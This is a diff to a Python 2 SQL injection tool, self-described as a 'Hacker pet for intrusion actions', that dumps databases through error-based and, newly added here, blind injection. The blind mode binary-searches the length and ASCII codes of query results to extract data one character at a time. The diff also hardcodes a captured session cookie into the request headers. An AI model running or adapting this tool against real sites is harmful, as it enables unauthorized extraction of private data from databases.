@@ -1,12 +1,12 @@
 #!/usr/bin/env python2
-import re, time, urllib, urllib2
+import re, sys, time, urllib, urllib2
 import argparse
 
 p = argparse.ArgumentParser( description = 'Hacker pet for intrusion actions...' )
 p.add_argument( '-u' , '--url'     , required = True          , help = 'url of site (can contain >>value<<)' )
-p.add_argument( '-p' , '--post'    , metavar = 'POST'         , help = 'to send POST data use this var'  )
-p.add_argument( '-c' , '--cookie'  , metavar = 'COOKIE'       , help = 'cookie to send with POST or GET' )
-p.add_argument( '-a' , '--avoid'   , default = ''             , help = 'string of characters wich should be avoided in sql queries' )
+p.add_argument( '-p' , '--post'    , metavar = 'POST'         , help = 'to send POST data use this var'      )
+p.add_argument( '-c' , '--cookie'  , metavar = 'COOKIE'       , help = 'cookie to send with POST or GET'     )
+p.add_argument( '-a' , '--avoid'   , default = ''             , help = 'string of characters wich should be avoided in sql queries'   )
 p.add_argument( '-v' , '--verbose' , action = 'append_const'  , const = 1, default = []  , help = 'how much verbose should be output' )
 p.add_argument( '-E' , '--engine'  , default = 'mysql', choices = ['mysql', 'postgres']  , help = 'engine of database'  )
 p.add_argument( '-D' , metavar = 'DATABASE' , help = 'database to use' )
@@ -22,7 +22,7 @@ pp = sp.add_parser( 'error', help = 'error-based SQL dumper' )
 pp.set_defaults( func = lambda : DError( args ).run() )
 
 pp = sp.add_parser( 'blind', help = 'blind-based SQL dumper' )
-pp.set_defaults( func = lambda : DError( args ).run() )
+pp.set_defaults( func = lambda : DBlind( args ).run() )
 
 pp = sp.add_parser( 'union', help = 'union-based SQL dumper' )
 pp.set_defaults( func = lambda : DError( args ).run() )
@@ -33,9 +33,13 @@ class API( object ):
     def __init__( self, args ):
         self.a = args
 
-    def log( self, lvl, msg ):
+    def log( self, lvl, msg, newline = True ):
         if lvl <= len( self.a.verbose ):
-            print msg
+            sys.stdout.write( msg )
+            if newline:
+                sys.stdout.write( '\n' )
+            sys.stdout.flush()
+
 
     def err( self, msg ):
         print msg
@@ -45,10 +49,18 @@ class API( object ):
         tsleep = 0.05
         for n_try in xrange( 5 ):   ## try five times to get url
             time.sleep( tsleep )
-            self.log( 2, "request %s:\n\tGET: %s\n\tPOST: %s\n\tCOOKIE:%s" % ( n_try, get, post, cookie ) )
+            self.log( 2, "[D] request %s:\n\tGET: %s\n\tPOST: %s\n\tCOOKIE:%s" % ( n_try, get, post, cookie ) )
+
+            ## TODO: HARDCODED Cookie !!!!
+            heads = { 'Accept'          : '''text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8''',
+                      'Accept-Language' : '''en-us,en;q=0.5''',
+                      'Accept-Encoding' : '''gzip, deflate''',
+                      'Accept-Charset'  : '''ISO-8859-1,utf-8;q=0.7,*;q=0.7''',
+                      'Connection'      : '''keep-alive''',
+                      'Cookie'          : '''parser=fmbiibgqagu1mue7joljpn68e4; __utma=249254534.28478131.1312521671.1312540729.1312545197.4; __utmz=249254534.1312545197.4.5.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=chaos%20constructions%202011; __utmc=249254534; __utmb=249254534.4.10.1312545197''' }
 
             o = urllib2.build_opener( )
-            r = urllib2.Request( get, post )
+            r = urllib2.Request( get, post, heads )
             if cookie:
                 pass
 
@@ -63,7 +75,7 @@ class API( object ):
             except urllib2.URLError, e:
                 code = None
                 tsleep   *= 2   ## double time to sleep
-                self.log( 0, '[[[ time out -- tsleep = %s ]]]' % tsleep )
+                self.log( 0, '[E] TIME OUT --> sleeping for %s seconds...' % tsleep )
 
             if code is not None:
                 break               ## go out from for loop...
@@ -84,7 +96,7 @@ class API( object ):
             lcnt = len( h.split('\n') )
 
         return c, lcnt, wcnt, ccnt
-        
+
     def html( self, val = r'\1' ):
         r = re.compile( r'>>(.*)<<' )
         vs = [ self.a.url, self.a.post, self.a.cookie ]
@@ -97,7 +109,7 @@ class API( object ):
         vs = map( lambda x: x and r.search( x ), vs )
         vs = filter( lambda x: x, vs )
         return vs[ 0 ].group( 1 )
-        
+
     def pval( self, val ):
         r = re.compile( r'>>(.*)<<' )
         vs = [ self.a.url, self.a.post, self.a.cookie ]
@@ -167,14 +179,83 @@ class DError( API ):
         if g:
             sql_cnt = sql( g + '_cnt' )
             if sql_cnt is None:
-                self.log( 0, 'result: ' + self.get( sql( g ) ) )
+                self.log( 0, '[o] result: ' + self.get( sql( g ) ) )
             else:
                 cnt = int( self.get( sql_cnt ) )
-                self.log( 0, 'count for %s is %s' % ( g, cnt ) )
+                self.log( 0, '[o] count for %s is %s' % ( g, cnt ) )
                 for i in xrange( cnt ):
-                    self.log( 0, 'result[%s]: %s' % ( i, self.get(sql(g,i)) ) )
+                    self.log( 0, '[o] result[%s]: %s' % ( i, self.get(sql(g,i)) ) )
         elif s:
             self.log( 0, 'result: ' + self.get( s ) )
+
+
+class DBlind( API ):
+    """ blind-based dumper
+    """
+    def dih( self, sss, s = 32, e = 126 ):
+        while e - s > 0:
+            m = ( e + s ) / 2
+            tsss = '(%s)>%s' % ( sss, m )
+            self.log( 2, '[D] testing: %s' % tsss )
+            _, l, _, _ = self.codes( tsss )
+            if l == self.l200:
+                self.log( 2, '[D] testing: l = %5s --> TRUE'  % l )
+                s, e = m + 1, e
+            elif l == self.l404:
+                self.log( 2, '[D] testing: l = %5s --> FALSE' % l )
+                s, e = s, m
+            else:
+                self.err( '[E] l != 200  ||  l != 404' )
+        return s
+
+
+    def get( self, sss ):
+        l = self.dih( urllib.quote( 'length((%s))' % sss ), s = 0, e = 1000 )             ## TODO: move this to filter functionality
+        self.log( 1, '[i] length(%s)=%s' % ( sss, l ) )
+        res = ''
+        for i in xrange( l ):
+            c = self.dih( urllib.quote( 'ascii(substring((%s),%s,1))' % ( sss, i+1 ) ) )  ## TODO: move this to filter functionality
+            res += chr( c )
+            self.log( 0, chr( c ), newline = False )
+        self.log( 0, '' )
+
+        return res
+
+
+    def run( self ):
+        self.log( 0, '[i] testing for TRUE/FALSE pages taking only lines count values...' )
+        t1 = self.codes( '2*2=4' )
+        t2 = self.codes( '2*2=5' )
+        self.log( 0, '[i] codes for TRUE  page --> ( c = %4s, [l = %5s], w = %5s, c = %5s )' % t1 )
+        self.log( 0, '[i] codes for FALSE page --> ( c = %4s, [l = %5s], w = %5s, c = %5s )' % t2 )
+        self.l200 = t1[ 1 ]   ## count of lines for normal answer
+        self.l404 = t2[ 1 ]   ## count of lines for error/404 answer
+
+        g = self.a.get
+        s = self.a.sql
+        if g:
+            sql_cnt = sql( g + '_cnt' )
+            if sql_cnt is None:
+                self.log( 0, '[i] SQL: %s' % sql( g ) )
+                res = val( sql( g ) )
+                self.log( 0, '[o] result: %s' % res )
+            else:
+                arr = []
+                self.log( 0, '[i] searching for count of %s' % g )
+                cnt = self.dih( sql_cnt, s = 0, e = 1000 )
+                self.log( 0, '[o] count for %s is %s' % ( g, cnt ) )
+                for i in xrange( cnt ):
+                    self.log( 0, '[i] dihotomy for %s row' % i )
+                    res = self.get( sql(g,i) )
+                    self.log( 0, '[o] result[%s]: %s' % ( i, res ) )
+                    arr.append( res )
+                self.log( 0, '[o] final answer --> %s' % arr )
+        elif s:
+            self.log( 0, '[i] SQL: %s' % s )
+            res = self.get( s )
+            self.log( 0, '[o] result: %s' % res )
+
+
 
 sql = SQL( args, args.engine )
 args.func()
